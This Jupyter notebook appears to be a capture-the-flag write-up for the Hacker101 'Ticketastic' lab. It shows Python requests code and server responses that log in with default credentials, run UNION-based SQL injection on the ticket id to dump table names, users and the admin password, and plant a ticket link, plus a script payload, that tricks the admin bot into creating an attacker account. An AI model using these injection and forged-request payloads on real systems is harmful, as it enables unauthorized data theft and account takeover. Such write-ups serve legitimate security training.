{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2514c273",
   "metadata": {},
   "source": [
    "# Ticketastic - Captured flags 2/2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "636e5472",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "url = \"https://54a3403cf5df6edbefd9f244f946686c.ctf.hacker101.com/\" # Home page\n",
    "\n",
    "session = requests.Session()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a2c375a3",
   "metadata": {},
   "source": [
    "## 1° Flag caught"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "862e91b0",
   "metadata": {},
   "source": [
    "### Demo instance's exploration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc51282d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Get the home page\n",
    "response = session.get(url)\n",
    "print(response.text)\n",
    "# Cookies\n",
    "print(session.cookies.get_dict())\n",
    "# Headers\n",
    "print(response.headers)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d6b917a9",
   "metadata": {},
   "source": [
    "Home page: \n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Home</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Welcome to Ticketastic</h1>\n",
    "\t\t<p><a href=\"newTicket\">Submit a Ticket</a> | <a href=\"login\">Admin Login</a></p>\n",
    "\t\t<h2>Demo Instance</h2>\n",
    "\t\t<p>Before you choose to purchase Ticketastic for your organization, feel free to give this demo instance a try.  All functionality is exposed, simply log in with admin/admin.  If you have any problems, put in a ticket on our official instance -- only the knowledgebase bot looks at the tickets submitted here.</p>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Cookies: {}\n",
    "Headers: {'Date': 'Sun, 27 Apr 2025 09:52:59 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '565', 'Connection': 'keep-alive', 'Server': 'openresty/1.27.1.2'}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9905c2d7",
   "metadata": {},
   "outputs": [],
   "source": [
    "# newTicket page\n",
    "response = session.get(url + \"newTicket\")\n",
    "print(response.text)\n",
    "\n",
    "# login page\n",
    "response = session.get(url + \"login\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f13ca489",
   "metadata": {},
   "source": [
    "NewTicket page:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Submit Ticket</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Submit Ticket</h1>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\tTitle: <input type=\"text\" name=\"title\"><br>\n",
    "\t\t\tBody: <textarea cols=\"25\" rows=\"5\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Login page:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Login</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Admin Login</h1>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\tUsername: <input type=\"text\" name=\"username\"><br>\n",
    "\t\t\tPassword: <input type=\"password\" name=\"password\"><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Login\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "87f1c2b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "# I know that the username is \"admin\" and the password is \"admin\" from the home page\n",
    "response = session.post(url + \"login\", data={\"username\": \"admin\", \"password\": \"admin\"})\n",
    "print(response.text)\n",
    "# Cookies\n",
    "print(session.cookies.get_dict())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8584d71f",
   "metadata": {},
   "source": [
    "Admin page:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Admin</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Admin Home</h1>\n",
    "\t\t<a href=\"newUser\">Create a new user</a>\n",
    "\t\t<h2>Pending Tickets</h2>\n",
    "\t\t<ul>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=1\">Example Ticket</a></li>\n",
    "\t\t\n",
    "\t\t</ul>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Custom cookie: {'session_level7a': 'eyJ1c2VyIjoiYWRtaW4ifQ.Gu-TLw.uaGqWr_JmcGxRAN3kmhtQ3WTiVM'}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39301df5",
   "metadata": {},
   "outputs": [],
   "source": [
    "# New user page\n",
    "response = session.get(url + \"newUser\")\n",
    "print(response.text)\n",
    "\n",
    "# Ticket page (id=1)\n",
    "response = session.get(url + \"ticket?id=1\")\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fbe639c9",
   "metadata": {},
   "source": [
    "New user page:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - New User</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>New User</h1>\n",
    "\t\t<form method=\"GET\">\n",
    "\t\t\tUsername: <input type=\"text\" name=\"username\"><br>\n",
    "\t\t\tPassword: <input type=\"password\" name=\"password\"><br>\n",
    "\t\t\tRepeat password: <input type=\"password\" name=\"password2\"><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Create\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Ticket page for id=1\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Ticket \"Example Ticket\"</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Example Ticket</h1>\n",
    "\t\t<pre>This is your ordinary, run of the mill ticket.  If any errors occurred during processing -- for instance, if the user gives a bad link -- these will be noted here.</pre>\n",
    "\t\t<h2>Our Reply</h2>\n",
    "\t\t<i>No reply yet</i>\n",
    "\t</body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f6c2d99",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Get an invalid id\n",
    "response = session.get(url + \"ticket?id='\")\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f284b64",
   "metadata": {},
   "source": [
    "Error obtained:\n",
    "```python\n",
    "Traceback (most recent call last):\n",
    "  File \"./main.py\", line 78, in ticket\n",
    "    cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])\n",
    "  File \"/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py\", line 255, in execute\n",
    "    self.errorhandler(self, exc, value)\n",
    "  File \"/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py\", line 50, in defaulterrorhandler\n",
    "    raise errorvalue\n",
    "ProgrammingError: (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1\")\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "049ebc68",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Get the number of tickets in the database\n",
    "response = session.get(url + \"ticket?id=0 union select count(*), count(*), count(*) from tickets;--\")\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b8909938",
   "metadata": {},
   "source": [
    "Output:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Ticket \"1\"</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>1</h1>\n",
    "\t\t<pre>1</pre>\n",
    "\t\t<h2>Our Reply</h2>\n",
    "\t\t<pre>1</pre>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I can infer that there is a single row in the table."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84a21875",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Get the names of the tables in the database\n",
    "response = session.get(url + \"ticket?id=0 union SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR '') AS concatenated_table_names, COUNT(*), COUNT(*) \\\n",
    "FROM information_schema.tables \\\n",
    "WHERE TABLE_SCHEMA = DATABASE()--\")\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fcd3bd31",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Ticket \"ticketsusers\"</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>ticketsusers</h1>\n",
    "\t\t<pre>2</pre>\n",
    "\t\t<h2>Our Reply</h2>\n",
    "\t\t<pre>2</pre>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I can infer that there are 2 tables in the database. They are respectively called: tickets and users."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "be1690e2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Get the names of the tables in the database\n",
    "response = session.get(url + \"ticket?id=0 union SELECT GROUP_CONCAT(username SEPARATOR '') AS concatenated_table_names, COUNT(*), COUNT(*) \\\n",
    "FROM users--\")\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6005d744",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Ticket \"admin\"</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>admin</h1>\n",
    "\t\t<pre>1</pre>\n",
    "\t\t<h2>Our Reply</h2>\n",
    "\t\t<pre>1</pre>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Only the user admin is available by default."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "67c87d1a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Try to create a new user\n",
    "response = session.get(url + \"newUser?username=ciao&password=ciao&password2=ciao\")\n",
    "response = session.post(url + \"login\", data={\"username\": \"ciao\", \"password\": \"ciao\"})\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e2950d24",
   "metadata": {},
   "source": [
    "Home page of the user 'ciao' is the same of the admin user.\n",
    "\n",
    "Home page:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Admin</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Admin Home</h1>\n",
    "\t\t<a href=\"newUser\">Create a new user</a>\n",
    "\t\t<h2>Pending Tickets</h2>\n",
    "\t\t<ul>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=1\">Example Ticket</a></li>\n",
    "\t\t\n",
    "\t\t</ul>\n",
    "\t</body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "83af16fa",
   "metadata": {},
   "source": [
    "### Live instance's exploration"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8e606b26",
   "metadata": {},
   "source": [
    "I know that the admin user is not associated with the admin password. So, I want to create a new user under my control. To do so, I need to fool the bot used to handle the tickets. To do that I will try to submit a fake ticket that will force the creation of a new user."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b768ca03",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create a new ticket\n",
    "title='<a href=\"http://localhost/newUser?username=test&password=test&password2=test\">TEST</a>'\n",
    "response = session.post(url + \"newTicket\", data={\"title\": title, \"body\": title})\n",
    "print(response.text)\n",
    "\n",
    "# Login with test:test\n",
    "response = session.post(url + \"login\", data={\"username\": \"test\", \"password\": \"test\"})\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "04458dcf",
   "metadata": {},
   "source": [
    "Homepage of the test user:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Admin</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Admin Home</h1>\n",
    "\t\t<a href=\"newUser\">Create a new user</a>\n",
    "\t\t<h2>Pending Tickets</h2>\n",
    "\t\t<ul>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=1\">Flag Won't Work</a></li>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=2\"><script> fetch('/newUser?username=ciaociao&password=ciaociao&password2=ciaociao')   .then(r=>r.text()).then(console.log).catch(console.error); </script></a></li>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=3\"><a   href=\"/newUser?username=ciaociao&password=ciaociao&password2=ciaociao\">   Crea utente </a></a></li>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=4\"><a   href=\"/newUser?username=ciaociao2&password=ciaociao&password2=ciaociao\">   Crea utente </a></a></li>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=5\">ref=\"http://localhost/newUser?username=test&password=test&password2=test\">TEST</a></a></li>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=6\"><a href=\"http://localhost/newUser?username=test&password=test&password2=test\">TEST</a></a></li>\n",
    "\t\t\n",
    "\t\t\t<li><a href=\"ticket?id=7\"><a href=\"http://localhost/newUser?username=test&password=test&password2=test\">TEST</a></a></li>\n",
    "\t\t\n",
    "\t\t</ul>\n",
    "\t</body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e8033656",
   "metadata": {},
   "source": [
    "I think to have just found the first flag. Let's read the first ticket."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "92f280f2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Read the ticket with id=1\n",
    "response = session.get(url + \"ticket?id=1\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "97f02586",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Ticket \"Flag Won't Work\"</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>Flag Won't Work</h1>\n",
    "\t\t<pre>I got the flag ^FLAG^...WRONG...$FLAG$ but the site rejects it.  Any thoughts?</pre>\n",
    "\t\t<h2>Our Reply</h2>\n",
    "\t\t<pre>Yeah, the correct flag is ^FLAG^...$FLAG$.  Let me know if you have any problems!</pre>\n",
    "\t</body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "095067b3",
   "metadata": {},
   "source": [
    "## 2° Flag caught"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "49325e9f",
   "metadata": {},
   "source": [
    "For the second flag I want to exploit the SQL vulnerability. Firstly, I want to know the admin's password."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0c0bde61",
   "metadata": {},
   "outputs": [],
   "source": [
    "response = session.get(url + \"ticket?id=0 union SELECT GROUP_CONCAT(password SEPARATOR '') AS concatenated_table_names, COUNT(*), COUNT(*) \\\n",
    "FROM users--\")\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "35ecedd9",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "\t<head>\n",
    "\t\t<title>Ticketastic Deluxe - Ticket \"^FLAG^...$FLAG$test\"</title>\n",
    "\t</head>\n",
    "\t<body>\n",
    "\t\t<h1>^FLAG^...$FLAG$test</h1>\n",
    "\t\t<pre>4</pre>\n",
    "\t\t<h2>Our Reply</h2>\n",
    "\t\t<pre>4</pre>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Fortunately, the password of the admin user is the second flag!"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
